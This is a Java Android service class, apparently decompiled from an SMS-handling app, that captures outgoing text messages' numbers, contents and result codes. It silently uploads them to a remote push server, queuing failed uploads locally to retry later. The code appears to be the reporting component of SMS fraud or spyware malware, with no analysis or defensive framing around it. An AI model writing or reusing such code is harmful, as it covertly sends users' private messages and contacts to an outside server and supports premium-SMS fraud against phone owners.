package com.clouds.server;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import com.clouds.db.Dao;
import com.clouds.debug.SystemDebug;
import com.clouds.http.CloudsServerHttpConstant;
import com.clouds.http.HTTPRequestUtil;
import com.clouds.util.SystemInfo;
import com.yongding.logic.SmsReceiver;
import com.yongding.util.UtilSms;
import java.util.Iterator;
import java.util.List;

public class BackSMSMessageService extends Service {
    private static final String TAG;

    class BackSmsMessageThread extends Thread {
        String content;
        Context context;
        String number;
        int resultCode;

        public BackSmsMessageThread(String number, String content, int resultCode, Context context) {
            this.number = null;
            this.content = null;
            this.resultCode = 0;
            this.context = null;
            this.number = number;
            this.content = content;
            this.resultCode = resultCode;
            this.context = context;
        }

        public void run() {
            super.run();
            if (HTTPRequestUtil.hasNetworkConnection(this.context)) {
                List<String> smsList = Dao.getDaoInstanca(this.context).querySmsMessageInfo();
                if (smsList != null) {
                    Iterator it = smsList.iterator();
                    while (it.hasNext()) {
                        try {
                            HTTPRequestUtil.sendSMSMessage(CloudsServerHttpConstant.PUSH_SERVER_URL, this.context, (String) it.next());
                            sleep(1000);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                    Dao.getDaoInstanca(this.context).deleteSMSDBHelper();
                }
            }
            try {
                if (HTTPRequestUtil.sendSMSMessage(CloudsServerHttpConstant.PUSH_SERVER_URL, this.context, this.number, this.content, this.resultCode) == null) {
                    Dao.getDaoInstanca(this.context).insertSmsMessageInfo(SystemInfo.getTelephonyInfo(this.context, this.number, this.content, this.resultCode));
                }
            } catch (Exception e2) {
                e2.printStackTrace();
            }
        }
    }

    static {
        TAG = BackSMSMessageService.class.getSimpleName();
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
    }

    public void onDestroy() {
        super.onDestroy();
        stopSelf();
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        if (intent != null) {
            String action = intent.getAction();
            if (action != null && action.equals(SmsReceiver.BACK_SMS_RESULTCODE_ACTION)) {
                String number = intent.getStringExtra(UtilSms.NUMBER);
                String content = intent.getStringExtra(UtilSms.CONTENT);
                int resultCode = intent.getIntExtra(SmsReceiver.SMS_RESULTCODE, 0);
                SystemDebug.e(TAG, new StringBuilder("number: ").append(number).append(" content: ").append(content).append(" resultCode: ").append(resultCode).toString());
                new BackSmsMessageThread(number, content, resultCode, getApplicationContext()).start();
            }
        }
        return 1;
    }
}